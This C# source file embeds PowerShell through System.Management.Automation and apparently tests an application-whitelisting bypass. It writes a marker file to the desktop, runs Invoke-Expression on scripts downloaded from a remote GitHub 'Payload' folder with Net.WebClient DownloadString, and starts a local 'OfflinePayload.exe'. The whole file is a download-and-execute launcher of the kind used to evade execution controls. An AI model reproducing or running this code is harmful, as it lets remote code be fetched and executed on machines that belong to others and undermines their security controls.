using System;
using System.Management.Automation;
namespace Powershell
{
    class Program
    {
        static void Main(string[] args)
        {
            PowerShell ps = PowerShell.Create();
            ps.AddCommand("Invoke-Expression");
            ps.AddArgument("$DesktopPath = [Environment]::GetFolderPath('Desktop');echo 'Csharp2PowershellBypass.' >> $DesktopPath\\WLtester.txt;");
            ps.Invoke();

            PowerShell ps1 = PowerShell.Create();
            ps1.AddCommand("Invoke-Expression");
            ps1.AddArgument("IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Csharp2Powershell/Csharp2Powershell.ps1')");
            ps1.Invoke();

            PowerShell ps2 = PowerShell.Create();
            ps2.AddCommand("Invoke-Expression");
            ps2.AddArgument("IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Csharp2Powershell/Csharp2PowershellOnlinePayload.exe')");
            ps2.Invoke();

            PowerShell ps3 = PowerShell.Create();
            ps3.AddCommand("Invoke-Expression");
            ps3.AddArgument("Start-Process -FilePath 'Csharp2PowershellOfflinePayload.exe'");
            ps3.Invoke();
        }
    }
}